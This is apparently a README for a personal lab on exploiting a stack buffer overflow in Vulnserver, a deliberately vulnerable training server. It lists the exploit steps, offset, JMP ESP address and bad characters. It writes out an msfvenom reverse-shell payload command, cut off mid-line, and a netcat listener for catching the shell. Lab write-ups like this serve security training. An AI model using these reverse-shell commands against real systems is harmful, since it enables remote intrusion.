# 🔐 Buffer Overflow Lab – Vulnserver Exploitation (Windows)

**Author:** Md. Maruf  
**Platform:** Kali Linux (Attacker), Windows 7 (Victim)  
**Target:** Vulnserver  
**Tools Used:** Immunity Debugger, mona.py, msfvenom, Python, netcat, VMware

---

## 🧠 Objective

Recreate a full buffer overflow exploit on a Windows-based vulnerable server (`Vulnserver`) from scratch. This includes fuzzing, finding the crash offset, controlling EIP, locating a `JMP ESP`, avoiding bad characters, and delivering a reverse shell.

---

## 🗂️ Project Structure

| Step | Folder Name               | Description                                               |
|------|---------------------------|-----------------------------------------------------------|
| 1️⃣   | `1-Spiking`              | Testing available commands with Spike to cause crash     |
| 2️⃣   | `2-Fuzzing`              | Fuzzing to determine crash point                         |
| 3️⃣   | `3-Finding-Offset`       | Using pattern to find exact EIP control offset           |
| 4️⃣   | `4-EIP-Overwrite`        | Confirming EIP control with unique value (`42424242`)    |
| 5️⃣   | `5-Bad-Characters`       | Sending bytes `\x01` to `\xff` to find bad chars         |
| 6️⃣   | `6-Finding-Right-Module` | Using mona.py to find `JMP ESP` in safe module           |
| 7️⃣   | `7-Generating-Shellcode` | Final exploit using reverse shell + NOP + JMP ESP        |
| 8️⃣   | `ROOT` (this README)     | Full project documentation & summary                     |

---

## 🚀 Final Exploit Chain

```python
"A" * 2003 + JMP ESP + "\x90" * 16 + shellcode

Offset: 2003

JMP ESP: 0x625011AF → \xAF\x11\x50\x62

Bad characters: \x00

Shellcode: msfvenom reverse shell (Python format)

📡 Shellcode Generation

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.xxx LPORT=4444 EXITFUNC=thread -f python -b "\x0

Start listener on Kali:
nc -lvnp 4444

Execute script:
python3 7-Generating-Shellcode/shellcode.py

✅ If successful, you'll get a reverse shell from the Windows target.


🏁 End Goal Achieved!
This lab demonstrates:

Manual buffer overflow exploitation

Reverse engineering & debugging

Payload delivery

Vulnerability analysis workflow

📎 Useful Links
Vulnserver: https://github.com/stephenbradshaw/vulnserver

Spike: https://corelan.be

